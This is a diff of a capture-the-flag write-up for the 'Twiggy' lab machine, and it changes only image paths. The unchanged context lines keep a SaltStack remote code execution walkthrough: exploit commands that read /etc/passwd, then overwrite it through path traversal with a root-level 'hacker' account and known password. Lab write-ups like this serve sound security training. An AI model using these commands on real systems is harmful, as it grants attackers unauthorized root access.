@@ -30,15 +30,15 @@ PORT     STATE SERVICE VERSION
 ## Web
 ### PORT: 80
 
-![img](/assets/images/CTF/Pg-Play/Twiggy/twiggy.png)
+![img](/assets/images/CTF/Proving_Grounds/Twiggy/twiggy.png)
 
 ### PORT: 8000
 
-![img](/assets/images/CTF/Pg-Play/Twiggy/8000.png)
+![img](/assets/images/CTF/Proving_Grounds/Twiggy/8000.png)
 
 The SaltStack Salt REST API is running.
 
-![img](/assets/images/CTF/Pg-Play/Twiggy/salt.png)
+![img](/assets/images/CTF/Proving_Grounds/Twiggy/salt.png)
 
 SaltStack is vulnerable to [Saltstack 3000.1 - Remote Code Execution](https://www.exploit-db.com/exploits/48421)
 
@@ -48,7 +48,7 @@ SaltStack is vulnerable to [Saltstack 3000.1 - Remote Code Execution](https://ww
 python exploit.py --master 192.168.174.62 --read /etc/passwd
 ```
 
-![img](/assets/images/CTF/Pg-Play/Twiggy/read.png)
+![img](/assets/images/CTF/Proving_Grounds/Twiggy/read.png)
 
 unable to obtain reverse shell using the `--exec` command in the exploit but we will be able to create and add our own new user account to the `/etc/passwd` file.
 
@@ -73,15 +73,15 @@ hacker:$1$iBeMKMaU$.O3VYqCZxUvapPL.OQ97/1:0:0:root:/root:/bin/bash
 python exploit.py --master 192.168.174.62 --upload-src passwd --upload-dest ../../../../../../../../../../etc/passwd
 ```
 
-![img](/assets/images/CTF/Pg-Play/Twiggy/write.png)
+![img](/assets/images/CTF/Proving_Grounds/Twiggy/write.png)
 
 **Verify the user existence**
 
-![img](/assets/images/CTF/Pg-Play/Twiggy/verify.png)
+![img](/assets/images/CTF/Proving_Grounds/Twiggy/verify.png)
 
 SSH to the attacking machine using the username as `hacker` and password `hacked`.
 
-![img](/assets/images/CTF/Pg-Play/Twiggy/root.png)
+![img](/assets/images/CTF/Proving_Grounds/Twiggy/root.png)
 
 **Root Obtained**
 
